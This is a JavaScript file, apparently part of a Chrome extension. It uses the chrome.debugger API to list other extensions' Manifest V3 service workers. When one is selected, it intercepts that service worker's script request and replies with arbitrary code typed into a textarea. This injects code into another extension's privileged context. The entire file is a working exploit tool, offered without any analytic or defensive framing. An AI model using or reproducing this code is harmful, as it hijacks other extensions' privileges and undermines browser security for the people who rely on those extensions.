let payload = document.querySelector(".textarea").textContent;
const target = { targetId: "browser" };
function getAllTargets() {
  return new Promise(async (resolve, reject) => {
    await chrome.debugger.attach(target, "1.3");
    let { targetInfos: targets } = await chrome.debugger.sendCommand(
      target,
      "Target.getTargets"
    );
    resolve(targets);
  });
}

async function getManifestV3Targets() {
  const extensions = [];
  const allTargets = await getAllTargets();
  for (let target in allTargets) {
    const { protocol } = new URL(allTargets[target].url);
    if (
      protocol == "chrome-extension:" &&
      allTargets[target].type == "service_worker"
    ) {
      extensions.push(allTargets[target]);
    }
  }
  return extensions;
}
async function onRequest(url) {
  payload = 'function () {' + payload + '}';
  await chrome.debugger.detach(target);
  await chrome.debugger.attach(target, "1.3");
  chrome.debugger.onEvent.addListener(async (details, info, event) => {
    console.log(event.request.url);
    if (event.request.url !== url) {
      await chrome.debugger.sendCommand(target, "Fetch.continueRequest", {
        requestId: event.requestId,
      });
      return;
    }
    await chrome.debugger.sendCommand(target, "Fetch.fulfillRequest", {
      requestId: event.requestId,
      responseCode: 200,
      body: btoa(`(${payload})()`),
    });
  });
  await chrome.debugger.sendCommand(target, "Fetch.enable");
}
async function openWindow(url) {
  await chrome.debugger.detach(target);
  await chrome.debugger.attach(target, "1.3");
   await chrome.debugger.sendCommand(
      target,
      "Target.createTarget",
      {
        url: url,
      }
    );
}
async function setUpButtons() {
  let targets = await getManifestV3Targets();
  for (const target in targets) {
    let button = document.createElement("button");
    button.textContent = targets[target].url;
    button.onclick = function () {
      onRequest(targets[target].url);
    };
    let id = document.createElement("h2");
    id.textContent =
      targets[target].url
        .split("chrome-extension://")[1]
        .toString()
        .split("/")[0] +
      " - " +
      targets[target].type;
    document.querySelector(".targets").appendChild(button);
    document.querySelector(".targets").appendChild(id);
  }
}
setUpButtons();
